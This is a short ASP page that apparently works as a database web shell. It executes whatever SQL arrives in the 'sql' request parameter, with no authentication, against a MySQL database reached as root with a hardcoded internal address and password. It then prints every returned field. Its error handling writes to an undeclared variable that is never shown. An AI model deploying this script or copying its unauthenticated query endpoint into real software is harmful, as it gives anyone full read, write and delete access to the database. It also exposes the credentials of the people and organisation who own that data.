<%
If Request("sql") <> "" Then

    Dim conn, rs, sql, outputDB
    sql = Request("sql")

    On Error Resume Next

    ' --- MySQL ODBC Driver ---
    Set conn = Server.CreateObject("ADODB.Connection")
    conn.Open "Driver={MySQL ODBC 8.0 Unicode Driver};Server=10.10.1.75;Port=3306;Database=flowhcms_hmc;User=root;Password=123qwe;Option=3;"

    If Err.Number <> 0 Then
        output = "DB Connection Error: " & Err.Description
    Else
        Set rs = conn.Execute(sql)

        If Err.Number <> 0 Then
            output = "SQL Error: " & Err.Description
        Else
            outputDB = "<pre>"
            Do Until rs.EOF
                Dim i
                For i = 0 To rs.Fields.Count - 1
                    outputDB = outputDB & rs.Fields(i).Name & ": " & rs.Fields(i).Value & vbCrLf
                Next
                outputDB = outputDB & vbCrLf
                rs.MoveNext
            Loop
            outputDB = outputDB & "</pre>"
        End If

        rs.Close
        conn.Close
    End If

End If
%>
